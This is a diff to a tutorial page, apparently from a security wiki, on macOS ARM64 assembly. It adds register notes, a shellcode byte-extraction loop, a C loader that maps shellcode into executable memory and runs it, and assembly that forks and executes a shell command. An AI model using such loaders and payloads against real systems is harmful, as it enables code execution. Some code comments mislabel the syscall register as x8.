@@ -21,9 +21,11 @@ ARM64, also known as ARMv8-A, is a 64-bit processor architecture used in various
 ARM64 has **31 general-purpose registers**, labeled `x0` through `x30`. Each can store a **64-bit** (8-byte) value. For operations that require only 32-bit values, the same registers can be accessed in a 32-bit mode using the names w0 through w30.
 
 1. **`x0`** to **`x7`** - These are typically used as scratch registers and for passing parameters to subroutines.
-2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction.
+   * **`x0`** also carries the return data of a function
+2. **`x8`** - In the Linux kernel, `x8` is used as the system call number for the `svc` instruction. **In macOS the x16 is the one used!**
 3. **`x9`** to **`x15`** - More temporary registers, often used for local variables.
 4. **`x16`** and **`x17`** - Temporary registers, also used for indirect function calls and PLT (Procedure Linkage Table) stubs.
+   * **`x16`** is used as the **system call number** for the **`svc`** instruction.
 5. **`x18`** - Platform register. On some platforms, this register is reserved for platform-specific uses.
 6. **`x19`** to **`x28`** - These are callee-saved registers. A function must preserve these registers' values for its caller.
 7. **`x29`** - **Frame pointer**.
@@ -107,6 +109,67 @@ ld -o shell shell.o -macosx_version_min 13.0 -lSystem -L /Library/Developer/Comm
 ```
 {% endcode %}
 
+To extract the bytes:
+
+```bash
+# Code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/extract.sh
+for c in $(objdump -d "s.o" | grep -E '[0-9a-f]+:' | cut -f 1 | cut -d : -f 2) ; do
+    echo -n '\\x'$c
+done
+```
+
+<details>
+
+<summary>C code to test the shellcode</summary>
+
+```c
+// code from https://github.com/daem0nc0re/macOS_ARM64_Shellcode/blob/master/helper/loader.c
+// gcc loader.c -o loader
+#include <stdio.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <stdlib.h>
+
+int (*sc)();
+
+char shellcode[] = "<INSERT SHELLCODE HERE>";
+
+int main(int argc, char **argv) {
+    printf("[>] Shellcode Length: %zd Bytes\n", strlen(shellcode));
+ 
+    void *ptr = mmap(0, 0x1000, PROT_WRITE | PROT_READ, MAP_ANON | MAP_PRIVATE | MAP_JIT, -1, 0);
+ 
+    if (ptr == MAP_FAILED) {
+        perror("mmap");
+        exit(-1);
+    }
+    printf("[+] SUCCESS: mmap\n");
+    printf("    |-> Return = %p\n", ptr);
+ 
+    void *dst = memcpy(ptr, shellcode, sizeof(shellcode));
+    printf("[+] SUCCESS: memcpy\n");
+    printf("    |-> Return = %p\n", dst);
+
+    int status = mprotect(ptr, 0x1000, PROT_EXEC | PROT_READ);
+
+    if (status == -1) {
+        perror("mprotect");
+        exit(-1);
+    }
+    printf("[+] SUCCESS: mprotect\n");
+    printf("    |-> Return = %d\n", status);
+
+    printf("[>] Trying to execute shellcode...\n");
+
+    sc = ptr;
+    sc();
+ 
+    return 0;
+}
+```
+
+</details>
+
 #### Shell
 
 Taken from [**here**](https://github.com/daem0nc0re/macOS\_ARM64\_Shellcode/blob/master/shell.s) and explained.
@@ -189,6 +252,52 @@ _main:
 cat_path: .asciz "/bin/cat"
 .align 2
 passwd_path: .asciz "/etc/passwd"
+```
+
+#### Invoke command with sh from a fork so the main process is not killed
+
+```armasm
+.section __TEXT,__text     ; Begin a new section of type __TEXT and name __text
+.global _main              ; Declare a global symbol _main
+.align 2                   ; Align the beginning of the following code to a 4-byte boundary
+
+_main:
+    ; Prepare the arguments for the fork syscall
+    mov x16, #2            ; Load the syscall number for fork (2) into x8
+    svc 0                  ; Make the syscall
+    cmp x1, #0             ; In macOS, if x1 == 0, it's parent process, https://opensource.apple.com/source/xnu/xnu-7195.81.3/libsyscall/custom/__fork.s.auto.html
+    beq _loop              ; If not child process, loop
+
+    ; Prepare the arguments for the execve syscall
+
+    sub sp, sp, #64        ; Allocate space on the stack
+    mov x1, sp             ; x1 will hold the address of the argument array
+    adr x0, sh_path
+    str x0, [x1]           ; Store the address of "/bin/sh" as the first argument
+    adr x0, sh_c_option    ; Get the address of "-c"
+    str x0, [x1, #8]       ; Store the address of "-c" as the second argument
+    adr x0, touch_command  ; Get the address of "touch /tmp/lalala"
+    str x0, [x1, #16]      ; Store the address of "touch /tmp/lalala" as the third argument
+    str xzr, [x1, #24]     ; Store NULL as the fourth argument (end of arguments)
+    
+    adr x0, sh_path
+    mov x2, xzr            ; Clear x2 to hold NULL (no environment variables)
+    mov x16, #59           ; Load the syscall number for execve (59) into x8
+    svc 0                  ; Make the syscall
+
+
+_exit:
+    mov x16, #1            ; Load the syscall number for exit (1) into x8
+    mov x0, #0             ; Set exit status code to 0
+    svc 0                  ; Make the syscall
+
+_loop: b _loop
+
+sh_path: .asciz "/bin/sh"
+.align 2
+sh_c_option: .asciz "-c"
+.align 2
+touch_command: .asciz "touch /tmp/lalala"
 ```
 
 <details>
